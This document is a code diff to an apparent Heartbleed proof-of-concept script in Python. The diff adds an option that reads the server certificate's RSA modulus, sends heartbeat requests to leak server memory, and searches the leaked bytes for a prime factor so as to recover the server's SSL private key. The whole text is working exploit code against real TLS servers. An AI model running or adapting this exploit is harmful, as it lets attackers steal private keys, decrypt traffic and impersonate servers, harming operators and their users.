@@ -12,9 +12,10 @@ def usage():
     print "      -h  --  show this message"
     print "      -d  --  Set the destiation host and port:  HOST:PORT"
     print "      -n  --  Set the number of requests to make, more will grab more memory"
+    print "      -p  --  Attempt to obtain the server's SSL private key"
 
 try:
-    opts, args = getopt.getopt(sys.argv[1:], "hd:n:")
+    opts, args = getopt.getopt(sys.argv[1:], "hd:n:p")
 except getopt.GetoptError as err:
     print str(err)
     usage()
@@ -22,6 +23,7 @@ except getopt.GetoptError as err:
 
 numb = 1
 address = "127.0.0.1:443"
+find_priv_key = False
 
 for o, a in opts:
     if o == "-d":
@@ -34,6 +36,8 @@ for o, a in opts:
     elif o == "-h":
         usage()
         sys.exit()
+    elif o == "-p":
+        find_priv_key = True
     else:
         assert False, "unhandled option"
 
@@ -74,6 +78,19 @@ except TLSRemoteAlert as a:
         raise
     sys.exit(-1)
 
+if connection.session.serverCertChain:
+    pubkey = connection.session.serverCertChain.x509List[0].publicKey
+    print("n = %s, e = %s" % (pubkey.n, pubkey.e))
+    num_pubkey_bits = numBits(pubkey.n)
+    print("pubkey_bits = %i" % num_pubkey_bits)
+    prime_len_bytes = (num_pubkey_bits + 15) // 16
+else:
+    if find_priv_key:
+        print("We don't have a public key to factor, bailing.")
+        sys.exit(-1)
+    pubkey = None
+
+
 # printGoodConnection(connection, stop-start)
 
 heartbeat = HeartBeat()
@@ -88,6 +105,20 @@ for x in range(0, numb):
     for result in connection._sendMsg(heartbeat):
         pass
 
-    print connection.readPOC(0xffff),
+    resp = connection.readPOC(0xffff)
+    print(resp)
+    resp = bytearray(resp)
+
+    if find_priv_key:
+        for i in range(0, len(resp)-prime_len_bytes):
+            # reverse the bytes, only works for little-endian
+            # targets (FIXME? Probably not worth it, would have
+            # to guess word length on big-endian.)
+            data = resp[i+prime_len_bytes:i:-1]
+            data = bytesToNumber(data)
+            #if data != 0: print(data)
+            if data > 1 and pubkey != None and (pubkey.n % data) == 0:
+                print("Success! p = %i, q = %i" % (data, pubkey.n//data))
+                sys.exit(0)
 
 connection.close()
